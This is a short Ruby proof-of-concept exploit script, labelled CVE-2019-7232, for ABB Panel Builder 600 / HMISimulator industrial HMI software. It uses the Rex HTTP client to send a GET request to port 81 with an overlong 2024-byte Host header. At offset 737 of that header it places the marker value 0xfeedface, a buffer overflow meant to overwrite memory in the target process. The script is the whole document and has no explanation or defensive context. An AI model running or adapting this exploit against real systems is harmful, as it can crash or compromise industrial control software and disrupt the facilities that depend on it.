#!/usr/bin/env ruby 
# CVE-2019-7232
# Panel Builder 600 Suite 2.6 / HMISimulator.exe -> HMIIdaInterface.dll/ ABB_Automation_Builder_V2.1.2_634

require 'rex'

host = ARGV[0]

def usage
   puts "[*] #{$0} <host>"
   exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "81", 
                                    context = {}, 
                                    ssl = false)

boom = Rex::Text.pattern_create(2024)
boom[737, 4] = [0xfeedface].pack('V')

req = sock.request_raw(
	{
		'uri'   => "/",
		'version' => '1.0',
		'method' => 'GET',
                'headers' => {
                            "Host" => boom,
                },
	})

	sock.send_request(req)
	data = sock.read_response()
rescue => e
puts "[!] #{e.to_s}"
end
